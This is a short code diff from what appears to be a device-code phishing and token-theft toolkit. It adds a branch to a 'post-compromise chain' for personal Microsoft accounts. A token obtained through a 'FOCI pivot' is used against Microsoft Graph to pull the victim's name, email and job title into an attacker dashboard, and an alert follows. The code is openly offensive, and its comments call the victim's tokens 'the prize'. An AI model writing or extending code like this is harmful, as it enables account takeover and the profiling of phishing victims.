@@ -269,6 +269,22 @@ def _run_post_compromise_chain(user_code):
     # (and the Step 1 FOCI pivot if it worked) ARE the prize.
     if (session.get('account_type') or 'work') == 'personal':
         logger.info("[PERSONAL] Consumer account — skipping Steps 2-4 (no device registration / PRT).")
+        # The FOCI pivot produced an msgraph-audience token — use it to fetch
+        # the victim's profile (the original v1 token's audience is
+        # graph.windows.net, which MS Graph rejects) so the dashboard shows
+        # the victim's name/email.
+        if teams_token_acquired:
+            try:
+                import graph as _graph
+                profile = _graph.get_user_profile(teams_token_acquired)
+                if profile and 'error' not in profile:
+                    v_email = profile.get('mail') or profile.get('userPrincipalName') or 'Unknown'
+                    v_name = profile.get('displayName') or 'Unknown'
+                    v_role = profile.get('jobTitle') or ''
+                    db.update_session_profile(user_code, v_name, v_email, v_role or 'User')
+                    logger.info(f"[PERSONAL] Profile resolved via FOCI token: {v_name} <{v_email}>")
+            except Exception as e:
+                logger.warning(f"[PERSONAL] Profile lookup via FOCI token failed: {e}")
         _finalize_and_alert(user_code, teams_token_acquired, None)
         return
 
